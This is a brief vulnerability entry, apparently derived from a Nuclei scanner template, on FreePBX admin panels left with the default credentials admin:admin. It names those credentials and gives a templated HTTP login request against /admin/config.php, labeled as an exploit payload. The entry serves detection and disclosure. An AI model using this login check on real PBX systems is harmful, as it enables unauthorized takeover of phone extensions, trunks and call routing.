# Vulnerability: FreePBX - Default Admin Credentials
**Classification:** FREEPBX
**Source:** Nuclei Template (`freepbx-default-login.yaml`)

## Description
Detected FreePBX administration panel was using default admin credentials (admin:admin). An attacker could gain full administrative access to the PBX system, manage extensions, trunks, and call routing.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /admin/config.php HTTP/1.1
Host: {{Hostname}}

POST /admin/config.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: {{session}}

username={{username}}&password={{password}}
```

